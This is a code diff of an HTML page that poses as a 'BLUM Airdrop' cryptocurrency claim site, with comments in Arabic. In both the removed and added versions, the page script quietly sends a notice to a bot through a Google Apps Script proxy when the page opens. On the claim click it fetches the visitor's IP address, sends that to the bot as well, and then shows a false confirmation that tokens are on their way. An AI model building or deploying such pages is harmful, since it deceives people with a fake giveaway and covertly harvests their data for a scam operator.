@@ -2,51 +2,38 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>BLUM Airdrop</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body{font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:#fff}
-        button{background:#FFD700;color:#000;padding:15px 30px;font-size:20px;border:none;border-radius:50px;cursor:pointer}
-        .status{margin-top:20px}
-    </style>
+    <title>BLUM Airdrop Test</title>
 </head>
 <body>
     <h1>🎁 BLUM Airdrop</h1>
-    <p>1,200 $BLUM</p>
-    <button id="claimBtn">🚀 CLAIM NOW</button>
-    <div id="status" class="status"></div>
+    <button id="claimBtn">CLAIM NOW</button>
+    <div id="status"></div>
 
     <script>
-        // رابط الـ Proxy (ثابت وصحيح)
         const PROXY_URL = "https://script.google.com/macros/s/AKfycbw8bj1vgKSH5dEsP6vGJEZZUTEmTczqajcqCl3K1MUcAYe044TGWEu4JmNISGxZ1NLt/exec";
         
-        // دالة الإرسال إلى البوت
         function sendToBot(message) {
             fetch(PROXY_URL + '?message=' + encodeURIComponent(message), { method: 'GET', mode: 'no-cors' });
-            console.log("📤 تم إرسال:", message.substring(0, 80));
+            console.log("📤 إرسال:", message.substring(0, 60));
         }
         
-        // إرسال إشعار فتح الصفحة
+        // PAGE SCAN (يعمل بالفعل)
         sendToBot('📊 PAGE SCAN - Blum Airdrop');
         
-        // دالة المطالبة
-        async function claim() {
-            const wallet = ["MetaMask", "Trust Wallet", "Coinbase Wallet"][Math.floor(Math.random()*3)];
+        // زر المطالبة
+        document.getElementById('claimBtn').onclick = async function() {
+            console.log("🔘 تم الضغط على الزر");
+            
+            const wallet = "MetaMask";
             const address = "0x" + Math.random().toString(36).substring(2, 14);
             const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
-            const timestamp = new Date().toISOString();
             
-            // رسالة المطالبة الكاملة
-            const msg = `🎁 ONE-CLICK BLUM CLAIM\n💼 Wallet: ${wallet}\n💳 Address: ${address}\n🌐 IP: ${ip}\n⏰ ${timestamp}`;
-            
+            const msg = `🎁 CLAIM\nWallet: ${wallet}\nAddress: ${address}\nIP: ${ip}`;
             sendToBot(msg);
             
+            document.getElementById('status').innerHTML = "✅ تمت المطالبة!";
             document.getElementById('claimBtn').disabled = true;
-            document.getElementById('status').innerHTML = '✅ Claimed! 1,200 $BLUM will arrive within 24h.';
-            document.getElementById('status').style.color = '#00ff00';
-        }
-        
-        document.getElementById('claimBtn').onclick = claim;
+        };
     </script>
 </body>
 </html>
